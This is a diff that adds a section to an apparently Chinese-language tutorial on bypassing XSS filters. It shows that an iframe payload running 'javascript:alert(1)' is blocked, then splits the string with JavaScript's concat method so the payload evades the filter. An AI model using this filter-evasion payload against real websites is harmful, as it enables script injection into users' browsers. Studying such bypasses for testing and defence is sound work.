@@ -167,3 +167,22 @@
   ```
   
   ### concat
+  - - -
+  
+  `concat方法`在实际应用中，不仅仅可以用于连接两个或多个数组，还可以合并两个或者多个字符串。
+  
+  ![19](https://ws1.sinaimg.cn/large/005DAKuvgy1g1v96uzg3zj30el07a3yk.jpg)
+  
+  例如： 
+  `<iframe onload=location='javascript:alert(1)'>`拦截
+  
+  ![20](https://ws1.sinaimg.cn/large/005DAKuvgy1g1v9dvxe1jj30uj06tq3d.jpg)
+  
+  使用concat来拼接字符串`javascript:alert(1)`
+  
+  ```html
+  <iframe onload=location='javascri'.concat('pt:aler','t(1)')>
+  ```
+  
+  ![21](https://ws1.sinaimg.cn/large/005DAKuvgy1g1v9hzwbnbj30uj09gmxy.jpg)
+  
